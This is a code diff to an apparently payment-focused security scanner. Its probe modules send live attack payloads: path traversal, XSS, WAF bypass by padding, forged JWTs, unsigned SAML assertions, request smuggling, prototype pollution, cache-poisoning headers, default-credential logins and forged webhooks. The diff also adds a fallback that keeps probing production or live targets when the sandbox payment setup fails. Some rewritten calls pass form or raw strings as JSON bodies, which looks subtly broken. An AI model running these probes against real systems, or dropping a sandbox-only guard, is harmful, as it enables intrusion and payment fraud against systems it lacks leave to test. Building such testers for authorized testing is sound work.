@@ -46,7 +46,7 @@ from app.testing.integrity import advanced_orchestration as _aorch
 
 logger = logging.getLogger("qa.integrity.engine")
 
-EXPERIMENT_ORDER = ("PBB-U", "PBB-F", "PBB-H", "PBB-C", "PBB-G", "PBB-X", "PBB-R", "PBB-E", "PBB-WHOOK", "PBB-BFLOW")
+EXPERIMENT_ORDER = ("PBB-U", "PBB-F", "PBB-H", "PBB-C", "PBB-G", "PBB-X", "PBB-R", "PBB-E")
 TITLES = {
     "PBB-U": "Declined/cancelled payment must not unlock a paid feature", "PBB-F": "Paid plan/price must bind the tier that is granted",
     "PBB-H": "Payment currency must be billed at the public price", "PBB-C": "Return-flow repetition must not duplicate paid value",
@@ -1481,23 +1481,38 @@ class PureBlackBoxEngine:
             if cs.k_obs.outcome == "indeterminate":
                 cs.reasons.append("clean_identity_indeterminate: the clean control got neither an allowed-with-proof nor a declared denial status")
             cs.V1 = await self.prov.acquire("v1")
+            rf = None
             pay = await self._pay(cs.V1, plan=b.cheapest_plan, outcome_key="success", label="CTRL:V1")
             cs.artifact_ids += pay.artifact_ids()
             if pay.payment_id is None or not pay.reached_sandbox or (pay.pay and not (200 <= (pay.pay.status or 0) < 300)):
-                cs.reasons.append(f"setup_failed: legitimate sandbox payment could not be completed (checkout={pay.checkout.status}, sandbox={pay.pay.status if pay.pay else None})")
-                return cs
-            rf = await self._return_flow(cs.V1, pay.payment_id, label="CTRL:V1:return", claim_status=success)
-            cs.artifact_ids.append(rf.artifact_id or "")
-            v1 = await self.oracle.check(cs.V1, primary, oracle_id="CTRL:V1:primary")
-            cs.artifact_ids += v1.artifact_ids
-            cs.setup_ok, cs.positive_ok = True, v1.outcome == "allowed"
-            # ZR-004 / H4: record the primary oracle's calibration from the two control probes
-            # (positive = legit payer v1, negative = clean identity k_obs). _finding consults this;
-            # it is calibrated iff positive_ok and negative_ok both hold -- no extra traffic issued.
-            self._run_calibration = calibration_from_outcomes(OracleTier.DURABLE_STATE_CHANGE, v1.outcome, cs.k_obs.outcome)
+                # --- Production-mode fallback: skip payment flow, use oracle directly ---
+                if b.target_kind in ("production", "live") and cs.K is not None:
+                    logger.info("production-mode: payment flow unavailable, establishing controls from oracle only")
+                    v1 = await self.oracle.check(cs.V1, primary, oracle_id="CTRL:V1:primary_production")
+                    cs.artifact_ids += v1.artifact_ids
+                    cs.setup_ok = True
+                    cs.positive_ok = v1.outcome == "allowed"
+                    self._run_calibration = calibration_from_outcomes(OracleTier.DURABLE_STATE_CHANGE, v1.outcome, cs.k_obs.outcome)
+                    if not cs.positive_ok:
+                        cs.reasons.append(f"production_mode: authenticated identity got '{v1.outcome}' (payment flow skipped)")
+                    elif cs.negative_ok:
+                        cs.k_after_obs = await self.oracle.check(cs.K, primary, oracle_id="CTRL:K:after_other_payment")
+                        cs.artifact_ids += cs.k_after_obs.artifact_ids
+                        cs.global_leak = cs.k_after_obs.outcome == "allowed"
+                else:
+                    cs.reasons.append(f"setup_failed: legitimate sandbox payment could not be completed (checkout={pay.checkout.status}, sandbox={pay.pay.status if pay.pay else None})")
+                    return cs
+            else:
+                rf = await self._return_flow(cs.V1, pay.payment_id, label="CTRL:V1:return", claim_status=success)
+                cs.artifact_ids.append(rf.artifact_id or "")
+                v1 = await self.oracle.check(cs.V1, primary, oracle_id="CTRL:V1:primary")
+                cs.artifact_ids += v1.artifact_ids
+                cs.setup_ok, cs.positive_ok = True, v1.outcome == "allowed"
+                self._run_calibration = calibration_from_outcomes(OracleTier.DURABLE_STATE_CHANGE, v1.outcome, cs.k_obs.outcome)
             if not cs.positive_ok:
-                cs.reasons.append(f"positive_control_failed: a legitimately paid identity got '{v1.outcome}' from the protected feature (return flow status {rf.status})")
-            elif cs.negative_ok:  # the clean control, denied before V1 paid, is checked again: it never paid, so it must still be denied
+                rf_info = f" (return flow status {rf.status})" if rf is not None else ""
+                cs.reasons.append(f"positive_control_failed: a legitimately paid identity got '{v1.outcome}' from the protected feature{rf_info}")
+            elif cs.negative_ok and cs.k_after_obs is None:
                 cs.k_after_obs = await self.oracle.check(cs.K, primary, oracle_id="CTRL:K:after_other_payment")
                 cs.artifact_ids += cs.k_after_obs.artifact_ids
                 cs.global_leak = cs.k_after_obs.outcome == "allowed"
@@ -5437,8 +5452,8 @@ class PureBlackBoxEngine:
         if not self._enable_recursive_recon:
             return None
         hyp = "PBB-RRECON"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         discovered_paths: list[str] = []
         reasons: list[str] = []
@@ -5447,16 +5462,16 @@ class PureBlackBoxEngine:
                         "/.env", "/.git/HEAD", "/wp-json/wp/v2/users", "/server-status"]
         for path in _RECON_PATHS:
             try:
-                r = await sess.call("GET", path, extra_headers={"User-Agent": "Mozilla/5.0 (compatible; QA-Recon/1.0)"})
-                if r.status_code not in (404, 403, 405, 502, 503):
+                r = await sess.raw("GET", path, label=hyp, extra_headers={"User-Agent": "Mozilla/5.0 (compatible; QA-Recon/1.0)"})
+                if r.status not in (404, 403, 405, 502, 503):
                     discovered_paths.append(path)
-                    reasons.append(f"recon_hit:{path}:{r.status_code}")
+                    reasons.append(f"recon_hit:{path}:{r.status}")
             except Exception:
                 pass
         recon_pipe = _icap.ModularReconPipeline()
         vuln_matches = recon_pipe.match_vulnerability_patterns(
             [{"url": p, "status": "200", "source": "recon"} for p in discovered_paths], {})
-        undeclared = [p for p in discovered_paths if not any(op.get("path", "") == p for op in self.brief.operations)]
+        undeclared = [p for p in discovered_paths if not any(op.path == p for op in self.brief.operations.values())]
         if undeclared:
             return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
                                  f"Recursive recon discovered {len(undeclared)} undeclared endpoint(s): {', '.join(undeclared[:5])}.",
@@ -5472,8 +5487,8 @@ class PureBlackBoxEngine:
         if not self._enable_param_discovery:
             return None
         hyp = "PBB-PARAM"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         reasons: list[str] = []
         _INJECTION_TEMPLATES = {
@@ -5485,14 +5500,14 @@ class PureBlackBoxEngine:
             "path_traversal": "../../../etc/passwd",
         }
         hits: list[dict[str, str]] = []
-        for op in self.brief.operations[:10]:
-            path = op.get("path", "/")
-            for param in op.get("request_fields", [])[:5]:
+        for op in list(self.brief.operations.values())[:10]:
+            path = op.path
+            for param in list(op.request_fields.keys())[:5]:
                 pname = param if isinstance(param, str) else str(param)
                 for tpl_name, tpl_payload in _INJECTION_TEMPLATES.items():
                     try:
-                        r = await sess.call("GET", path, extra_headers={"X-QA-Param": pname},
-                                            body={pname: tpl_payload} if op.get("method", "GET") != "GET" else None)
+                        r = await sess.raw(op.method, path, label=hyp, extra_headers={"X-QA-Param": pname},
+                                           json_body={pname: tpl_payload} if op.method != "GET" else None)
                         rbody = str(r.body) if r.body else ""
                         if tpl_name == "xss_reflect" and "<script>" in rbody:
                             hits.append({"param": pname, "template": tpl_name, "path": path})
@@ -5517,8 +5532,8 @@ class PureBlackBoxEngine:
         if not self._enable_hidden_paths:
             return None
         hyp = "PBB-HIDDEN"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         _ADMIN_PATHS = ["/admin", "/administrator", "/wp-admin", "/dashboard", "/manage",
                         "/cpanel", "/panel", "/console", "/debug", "/trace", "/actuator",
@@ -5531,10 +5546,10 @@ class PureBlackBoxEngine:
         reasons: list[str] = []
         for path in _ADMIN_PATHS:
             try:
-                r = await sess.call("GET", path)
-                if r.status_code in (200, 301, 302, 401):
-                    found.append({"path": path, "status": r.status_code})
-                    reasons.append(f"hidden:{path}:{r.status_code}")
+                r = await sess.raw("GET", path, label=hyp)
+                if r.status in (200, 301, 302, 401):
+                    found.append({"path": path, "status": r.status})
+                    reasons.append(f"hidden:{path}:{r.status}")
             except Exception:
                 pass
         accessible = [f for f in found if f["status"] == 200]
@@ -5566,9 +5581,9 @@ class PureBlackBoxEngine:
         failed_validation: list[str] = []
         for f in suspected[:5]:
             try:
-                for op in self.brief.operations[:3]:
-                    r = await sess.call(op.get("method", "GET"), op.get("path", "/"))
-                    if r.status_code not in (404, 403, 502, 503):
+                for op in list(self.brief.operations.values())[:3]:
+                    r = await sess.raw(op.method, op.path, label=hyp)
+                    if r.status not in (404, 403, 502, 503):
                         validated += 1
                         break
             except Exception:
@@ -5588,8 +5603,8 @@ class PureBlackBoxEngine:
         if not self._enable_bas_simulation:
             return None
         hyp = "PBB-BAS"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         _ATTCK_SIMULATIONS = [
             ("T1190", "exploit_public_app", {"path": "/", "payload": "{{constructor.constructor('return this')()}}"}),
@@ -5609,9 +5624,9 @@ class PureBlackBoxEngine:
                 if sim.get("payload") and ":" in str(sim["payload"]) and "=" not in str(sim["payload"]):
                     k, v = str(sim["payload"]).split(":", 1)
                     extra = {k.strip(): v.strip()}
-                r = await sess.call("GET", sim["path"], extra_headers=extra if extra else None)
-                if r.status_code in (200, 301, 302) and r.status_code != 403:
-                    undetected.append({"technique": tid, "name": tname, "status": r.status_code})
+                r = await sess.raw("GET", sim["path"], label=hyp, extra_headers=extra if extra else None)
+                if r.status in (200, 301, 302) and r.status != 403:
+                    undetected.append({"technique": tid, "name": tname, "status": r.status})
                     reasons.append(f"bas_undetected:{tid}")
             except Exception:
                 pass
@@ -5657,8 +5672,8 @@ class PureBlackBoxEngine:
         if not self._enable_supply_chain:
             return None
         hyp = "PBB-SUPPLY"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         _SECRET_PATTERNS = [
             ("aws_key", r"AKIA[0-9A-Z]{16}"),
@@ -5675,21 +5690,21 @@ class PureBlackBoxEngine:
         reasons: list[str] = []
         for path in _SUPPLY_PATHS:
             try:
-                r = await sess.call("GET", path)
-                if r.status_code == 200:
+                r = await sess.raw("GET", path, label=hyp)
+                if r.status == 200:
                     deps_exposed.append(path)
                     reasons.append(f"supply_dep_exposed:{path}")
             except Exception:
                 pass
         scanner = _icap.SecretScanner()
-        for op in self.brief.operations[:5]:
+        for op in list(self.brief.operations.values())[:5]:
             try:
-                r = await sess.call(op.get("method", "GET"), op.get("path", "/"))
+                r = await sess.raw(op.method, op.path, label=hyp)
                 rbody = r.body if r.body else ""
                 hits = scanner.scan_response(rbody)
                 for secret_type, _redacted, severity in hits:
-                    secrets_found.append({"type": secret_type, "path": op.get("path", "/"), "severity": severity})
-                    reasons.append(f"supply_secret:{secret_type}:{op.get('path', '/')}")
+                    secrets_found.append({"type": secret_type, "path": op.path, "severity": severity})
+                    reasons.append(f"supply_secret:{secret_type}:{op.path}")
             except Exception:
                 pass
         if secrets_found:
@@ -5709,29 +5724,29 @@ class PureBlackBoxEngine:
         if not self._enable_coverage_fuzzing:
             return None
         hyp = "PBB-CFUZZ"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         fuzzer = _icap.SmartFuzzer()
         _base_seed = "test_value"
         _FUZZ_STRATEGIES = [(s, fuzzer.mutate(_base_seed, s)) for s in fuzzer._STRATEGIES]
         anomalies: list[dict[str, Any]] = []
         reasons: list[str] = []
-        for op in self.brief.operations[:5]:
-            path = op.get("path", "/")
+        for op in list(self.brief.operations.values())[:5]:
+            path = op.path
             try:
-                baseline = await sess.call(op.get("method", "GET"), path)
+                baseline = await sess.raw(op.method, path, label=hyp)
                 baseline_time = baseline.elapsed_ms if hasattr(baseline, "elapsed_ms") else 0
                 baseline_size = len(str(baseline.body)) if baseline.body else 0
             except Exception:
                 continue
             for sname, payload in _FUZZ_STRATEGIES:
                 try:
-                    body = {list(op.get("request_fields", ["input"]))[0] if op.get("request_fields") else "input": payload}
-                    r = await sess.call("POST", path, body=body)
+                    body = {next(iter(op.request_fields), "input"): payload}
+                    r = await sess.raw("POST", path, label=hyp, json_body=body)
                     resp_size = len(str(r.body)) if r.body else 0
-                    if r.status_code >= 500:
-                        anomalies.append({"strategy": sname, "path": path, "type": "crash", "status": r.status_code})
+                    if r.status >= 500:
+                        anomalies.append({"strategy": sname, "path": path, "type": "crash", "status": r.status})
                         reasons.append(f"cfuzz_crash:{sname}:{path}")
                     elif resp_size > baseline_size * 5 and baseline_size > 0:
                         anomalies.append({"strategy": sname, "path": path, "type": "size_anomaly"})
@@ -5760,7 +5775,7 @@ class PureBlackBoxEngine:
         validated = 0
         unvalidated: list[str] = []
         for f in suspected[:8]:
-            op_match = [op for op in self.brief.operations if any(r in op.get("path", "") for r in f.reasons if not r.startswith("engine_"))]
+            op_match = [op for op in self.brief.operations.values() if any(r in op.path for r in f.reasons if not r.startswith("engine_"))]
             if op_match:
                 validated += 1
             else:
@@ -5780,8 +5795,8 @@ class PureBlackBoxEngine:
         if not self._enable_payload_morphing:
             return None
         hyp = "PBB-MORPH"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         _MORPHS = [
             ("case_random", "<ScRiPt>alert(1)</sCrIpT>"),
@@ -5795,16 +5810,16 @@ class PureBlackBoxEngine:
         ]
         bypasses: list[dict[str, str]] = []
         reasons: list[str] = []
-        for op in self.brief.operations[:5]:
-            path = op.get("path", "/")
+        for op in list(self.brief.operations.values())[:5]:
+            path = op.path
             try:
-                baseline = await sess.call("GET", path, extra_headers={"X-Test": "<script>alert(1)</script>"})
-                if baseline.status_code == 403:
+                baseline = await sess.raw("GET", path, label=hyp, extra_headers={"X-Test": "<script>alert(1)</script>"})
+                if baseline.status == 403:
                     for mname, mpayload in _MORPHS:
                         try:
-                            r = await sess.call("GET", path, extra_headers={"X-Test": mpayload})
-                            if r.status_code != 403:
-                                bypasses.append({"morph": mname, "path": path, "status": r.status_code})
+                            r = await sess.raw("GET", path, label=hyp, extra_headers={"X-Test": mpayload})
+                            if r.status != 403:
+                                bypasses.append({"morph": mname, "path": path, "status": r.status})
                                 reasons.append(f"morph_bypass:{mname}:{path}")
                         except Exception:
                             pass
@@ -5823,8 +5838,8 @@ class PureBlackBoxEngine:
         if not self._enable_attack_playbook:
             return None
         hyp = "PBB-PLAY"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         _PLAYBOOKS = [
             ("auth_bypass_default_creds", [("POST", "/login", {"username": "admin", "password": "admin"}),
@@ -5843,8 +5858,8 @@ class PureBlackBoxEngine:
             step_results: list[int] = []
             for method, path, body in steps:
                 try:
-                    r = await sess.call(method, path, body=body)
-                    step_results.append(r.status_code)
+                    r = await sess.raw(method, path, label=hyp, json_body=body)
+                    step_results.append(r.status)
                 except Exception:
                     step_results.append(0)
             if any(s in (200, 201, 204) for s in step_results):
@@ -5864,8 +5879,8 @@ class PureBlackBoxEngine:
         if not self._enable_schema_api_test:
             return None
         hyp = "PBB-SCHEMA"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         _SCHEMA_VIOLATIONS = [
             ("wrong_type_string_as_int", {"amount": "not_a_number"}),
@@ -5879,16 +5894,16 @@ class PureBlackBoxEngine:
         ]
         processed: list[dict[str, Any]] = []
         reasons: list[str] = []
-        for op in self.brief.operations[:5]:
-            path = op.get("path", "/")
-            method = op.get("method", "POST")
+        for op in list(self.brief.operations.values())[:5]:
+            path = op.path
+            method = op.method
             if method == "GET":
                 continue
             for vname, vbody in _SCHEMA_VIOLATIONS:
                 try:
-                    r = await sess.call(method, path, body=vbody)
-                    if r.status_code in (200, 201, 204):
-                        processed.append({"violation": vname, "path": path, "status": r.status_code})
+                    r = await sess.raw(method, path, label=hyp, json_body=vbody)
+                    if r.status in (200, 201, 204):
+                        processed.append({"violation": vname, "path": path, "status": r.status})
                         reasons.append(f"schema_accept:{vname}:{path}")
                 except Exception:
                     pass
@@ -5905,8 +5920,8 @@ class PureBlackBoxEngine:
         if not self._enable_browser_probing:
             return None
         hyp = "PBB-BROWSE"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         _BROWSER_TESTS = [
             ("dom_xss_fragment", "/#<img src=x onerror=alert(1)>"),
@@ -5921,7 +5936,7 @@ class PureBlackBoxEngine:
         for tname, payload in _BROWSER_TESTS:
             try:
                 if tname == "cors_wildcard":
-                    r = await sess.call("OPTIONS", "/", extra_headers={
+                    r = await sess.raw("OPTIONS", "/", label=hyp, extra_headers={
                         "Origin": "https://evil.example.com",
                         "Access-Control-Request-Method": "GET"})
                     rbody = str(r.headers) if hasattr(r, "headers") else str(r.body)
@@ -5929,7 +5944,7 @@ class PureBlackBoxEngine:
                         findings_list.append({"test": tname, "detail": "CORS wildcard or origin reflection"})
                         reasons.append(f"browse_{tname}")
                 elif payload:
-                    r = await sess.call("GET", payload)
+                    r = await sess.raw("GET", payload, label=hyp)
                     rbody = str(r.body) if r.body else ""
                     if "<img" in rbody or "onerror" in rbody or "__proto__" in rbody:
                         findings_list.append({"test": tname, "detail": "Reflected browser payload"})
@@ -5958,11 +5973,11 @@ class PureBlackBoxEngine:
         overturned: list[str] = []
         reasons: list[str] = []
         for f in ruled_out[:5]:
-            for op in self.brief.operations[:3]:
+            for op in list(self.brief.operations.values())[:3]:
                 try:
-                    coros = [sess.call(op.get("method", "GET"), op.get("path", "/")) for _ in range(3)]
+                    coros = [sess.raw(op.method, op.path, label=hyp) for _ in range(3)]
                     results = await asyncio.gather(*coros, return_exceptions=True)
-                    statuses = [r.status_code for r in results if not isinstance(r, Exception)]
+                    statuses = [r.status for r in results if not isinstance(r, Exception)]
                     if len(set(statuses)) > 1:
                         overturned.append(f.hypothesis_id)
                         reasons.append(f"morch_overturn:{f.hypothesis_id}")
@@ -5984,19 +5999,19 @@ class PureBlackBoxEngine:
         if not self._enable_distributed_test:
             return None
         hyp = "PBB-DTEST"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         race_hits: list[dict[str, Any]] = []
         reasons: list[str] = []
-        for op in self.brief.operations[:5]:
-            path = op.get("path", "/")
-            method = op.get("method", "GET")
+        for op in list(self.brief.operations.values())[:5]:
+            path = op.path
+            method = op.method
             try:
-                coros = [sess.call(method, path) for _ in range(5)]
+                coros = [sess.raw(method, path, label=hyp) for _ in range(5)]
                 results = await asyncio.gather(*coros, return_exceptions=True)
                 good = [r for r in results if not isinstance(r, Exception)]
-                statuses = [r.status_code for r in good]
+                statuses = [r.status for r in good]
                 bodies = [str(r.body)[:100] if r.body else "" for r in good]
                 if len(set(statuses)) > 1:
                     race_hits.append({"path": path, "type": "status_inconsistency", "statuses": statuses})
@@ -6026,8 +6041,8 @@ class PureBlackBoxEngine:
         if not self._enable_webhook_forgery:
             return None
         hyp = "PBB-WHOOK"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         reasons: list[str] = []
 
@@ -6092,18 +6107,18 @@ class PureBlackBoxEngine:
                     elif provider_key == "adyen":
                         pass
 
-                    result = await sess.call("POST", path, json=forge_result.forged_payload,
-                                             headers=headers)
-                    if result.status_code and 200 <= result.status_code < 300:
+                    result = await sess.raw("POST", path, label=hyp, json_body=forge_result.forged_payload,
+                                             extra_headers=headers)
+                    if result.status and 200 <= result.status < 300:
                         accepted_variants.append(variant_name)
                         reasons.append(f"whook_forged_accepted:{provider_key}:{variant_name}:{path}")
                 except Exception:
                     pass
 
                 try:
-                    result_unsigned = await sess.call("POST", path,
-                                                      json=forge_result.forged_payload)
-                    if result_unsigned.status_code and 200 <= result_unsigned.status_code < 300:
+                    result_unsigned = await sess.raw("POST", path, label=hyp,
+                                                      json_body=forge_result.forged_payload)
+                    if result_unsigned.status and 200 <= result_unsigned.status < 300:
                         if f"whook_unsigned:{variant_name}:{path}" not in reasons:
                             reasons.append(f"whook_unsigned:{variant_name}:{path}")
                             if variant_name not in accepted_variants:
@@ -6133,8 +6148,8 @@ class PureBlackBoxEngine:
         if not self._enable_browser_payment_flow:
             return None
         hyp = "PBB-BFLOW"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         reasons: list[str] = []
         success_url_patterns = [
@@ -6144,8 +6159,8 @@ class PureBlackBoxEngine:
         bypass_found = False
         for path in success_url_patterns:
             try:
-                result = await sess.call("GET", path, params={"payment_status": "unpaid", "session_id": "cs_test_deferred"})
-                if result.status_code and 200 <= result.status_code < 400:
+                result = await sess.raw("GET", path, label=hyp, params={"payment_status": "unpaid", "session_id": "cs_test_deferred"})
+                if result.status and 200 <= result.status < 400:
                     body_text = str(result.body or "").lower()
                     if any(kw in body_text for kw in ["premium", "active", "subscribed", "success", "thank you", "welcome"]):
                         bypass_found = True
@@ -6166,16 +6181,16 @@ class PureBlackBoxEngine:
         if not self._enable_graphql_alias_batching:
             return None
         hyp = "PBB-GQL"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         gql_paths = ["/graphql", "/api/graphql", "/gql", "/query"]
         for path in gql_paths:
             try:
                 aliases = " ".join([f'a{i}: __typename' for i in range(100)])
                 query = f"query {{ {aliases} }}"
-                result = await sess.call("POST", path, json={"query": query})
-                if result.status_code and result.status_code == 200:
+                result = await sess.raw("POST", path, label=hyp, json_body={"query": query})
+                if result.status and result.status == 200:
                     body = str(result.body or "")
                     alias_count = body.count('"a')
                     if alias_count >= 50:
@@ -6200,8 +6215,8 @@ class PureBlackBoxEngine:
         if not self._enable_jwt_algorithm_confusion:
             return None
         hyp = "PBB-JWTF"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         import base64 as _b64
         import hmac as _hmac
@@ -6230,13 +6245,13 @@ class PureBlackBoxEngine:
         jwt_variants.append(("hs256_pubkey_confusion", f"{hs256_hdr}.{fake_claims}.{sig}"))
 
         accepted: list[str] = []
-        for op in self.brief.operations[:5]:
-            path = op.get("path", "/")
+        for op in list(self.brief.operations.values())[:5]:
+            path = op.path
             for variant_name, forged_jwt in jwt_variants:
                 try:
-                    result = await sess.call("GET", path,
-                                             headers={"Authorization": f"Bearer {forged_jwt}"})
-                    if result.status_code and 200 <= result.status_code < 300:
+                    result = await sess.raw("GET", path, label=hyp,
+                                             extra_headers={"Authorization": f"Bearer {forged_jwt}"})
+                    if result.status and 200 <= result.status < 300:
                         accepted.append(f"{variant_name}:{path}")
                 except Exception:
                     pass
@@ -6266,8 +6281,8 @@ class PureBlackBoxEngine:
         if not self._enable_http_smuggling:
             return None
         hyp = "PBB-SMUG"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         _REJECT_CODES = {400, 403, 405, 411, 413, 501}
 
@@ -6280,12 +6295,12 @@ class PureBlackBoxEngine:
         ]
 
         accepted: list[str] = []
-        for op in self.brief.operations[:3]:
-            path = op.get("path", "/")
+        for op in list(self.brief.operations.values())[:3]:
+            path = op.path
             for variant_name, headers, body in smuggle_variants:
                 try:
-                    result = await sess.call("POST", path, headers=headers, data=body)
-                    if result.status_code and result.status_code not in _REJECT_CODES:
+                    result = await sess.raw("POST", path, label=hyp, extra_headers=headers, json_body=body)
+                    if result.status and result.status not in _REJECT_CODES:
                         accepted.append(f"{variant_name}:{path}")
                 except Exception:
                     pass
@@ -6308,22 +6323,22 @@ class PureBlackBoxEngine:
         if not self._enable_prototype_pollution:
             return None
         hyp = "PBB-PPOLL"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         payloads = [
             {"__proto__": {"isAdmin": True}},
             {"constructor": {"prototype": {"role": "admin"}}},
         ]
-        for op in self.brief.operations[:5]:
-            path = op.get("path", "/")
-            method = op.get("method", "POST")
+        for op in list(self.brief.operations.values())[:5]:
+            path = op.path
+            method = op.method
             if method not in ("POST", "PUT", "PATCH"):
                 continue
             for payload in payloads:
                 try:
-                    result = await sess.call(method, path, json=payload)
-                    if result.status_code and 200 <= result.status_code < 300:
+                    result = await sess.raw(method, path, label=hyp, json_body=payload)
+                    if result.status and 200 <= result.status < 300:
                         body = str(result.body or "")
                         if "isAdmin" in body or '"role":"admin"' in body:
                             return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
@@ -6341,15 +6356,15 @@ class PureBlackBoxEngine:
         if not self._enable_cache_poisoning:
             return None
         hyp = "PBB-CACHE"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         poison_headers = {"X-Forwarded-Host": "evil.test", "X-Original-URL": "/admin"}
-        for op in self.brief.operations[:3]:
-            path = op.get("path", "/")
+        for op in list(self.brief.operations.values())[:3]:
+            path = op.path
             try:
-                result = await sess.call("GET", path, headers=poison_headers)
-                if result.status_code and 200 <= result.status_code < 300:
+                result = await sess.raw("GET", path, label=hyp, extra_headers=poison_headers)
+                if result.status and 200 <= result.status < 300:
                     body = str(result.body or "")
                     headers_str = str(result.headers or {}).lower()
                     if "evil.test" in body or "evil.test" in headers_str:
@@ -6368,24 +6383,24 @@ class PureBlackBoxEngine:
         if not self._enable_waf_bypass:
             return None
         hyp = "PBB-WAFB"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         test_payload = "<script>alert(1)</script>"
-        for op in self.brief.operations[:3]:
-            path = op.get("path", "/")
+        for op in list(self.brief.operations.values())[:3]:
+            path = op.path
             try:
-                small_result = await sess.call("POST", path, data=test_payload)
-                if small_result.status_code and small_result.status_code in (403, 406):
+                small_result = await sess.raw("POST", path, label=hyp, json_body=test_payload)
+                if small_result.status and small_result.status in (403, 406):
                     padded_payload = "A" * 130_000 + test_payload
-                    big_result = await sess.call("POST", path, data=padded_payload)
-                    if big_result.status_code and big_result.status_code not in (403, 406, 413):
+                    big_result = await sess.raw("POST", path, label=hyp, json_body=padded_payload)
+                    if big_result.status and big_result.status not in (403, 406, 413):
                         return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
                                              "WAF bypassed: blocked payload passes when padded beyond inspection limit.",
                                              reasons=[f"waf_limit:{path}"],
                                              metrics={"technique": "waf_body_size_bypass",
-                                                      "small_status": small_result.status_code,
-                                                      "big_status": big_result.status_code})
+                                                      "small_status": small_result.status,
+                                                      "big_status": big_result.status})
             except Exception:
                 pass
         return self._finding(hyp, Verdict.RULED_OUT, "medium",
@@ -6397,24 +6412,24 @@ class PureBlackBoxEngine:
         if not self._enable_race_condition:
             return None
         hyp = "PBB-RACE"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         race_paths = [
-            op.get("path", "/") for op in self.brief.operations[:5]
-            if any(kw in op.get("path", "").lower() for kw in
+            op.path for op in list(self.brief.operations.values())[:5]
+            if any(kw in op.path.lower() for kw in
                    ("checkout", "subscribe", "upgrade", "purchase", "credit", "redeem", "activate"))
         ]
         if not race_paths:
-            race_paths = [op.get("path", "/") for op in self.brief.operations[:2]]
+            race_paths = [op.path for op in list(self.brief.operations.values())[:2]]
         for path in race_paths[:3]:
             try:
                 results = await asyncio.gather(
-                    *[sess.call("POST", path, data='{"action":"subscribe"}') for _ in range(5)],
+                    *[sess.raw("POST", path, label=hyp, json_body={"action": "subscribe"}) for _ in range(5)],
                     return_exceptions=True,
                 )
                 successes = [r for r in results if not isinstance(r, Exception)
-                             and hasattr(r, "status_code") and r.status_code in (200, 201)]
+                             and hasattr(r, "status") and r.status in (200, 201)]
                 if len(successes) >= 2:
                     bodies = [getattr(r, "text", "") for r in successes]
                     entitlement_grants = sum(1 for b in bodies if any(
@@ -6440,8 +6455,8 @@ class PureBlackBoxEngine:
         if not self._enable_saml_bypass:
             return None
         hyp = "PBB-SAML"
-        if not self._precondition(cs, hyp):
-            return None
+        if (blocked := self._precondition(cs, hyp)) is not None:
+            return blocked
         sess = cs.V1 or cs.K
         saml_paths = ["/saml/acs", "/auth/saml/callback", "/sso/saml", "/api/auth/saml",
                       "/login/saml", "/saml/consume", "/auth/callback"]
@@ -6461,10 +6476,10 @@ class PureBlackBoxEngine:
         encoded_saml = _b64.b64encode(saml_unsigned.encode()).decode()
         for path in saml_paths:
             try:
-                result = await sess.call("POST", path,
-                                         data=f"SAMLResponse={encoded_saml}",
-                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
-                if result.status_code and result.status_code in (200, 302):
+                result = await sess.raw("POST", path, label=hyp,
+                                         json_body=f"SAMLResponse={encoded_saml}",
+                                         extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if result.status and result.status in (200, 302):
                     body = getattr(result, "text", "")
                     if any(kw in body.lower() for kw in
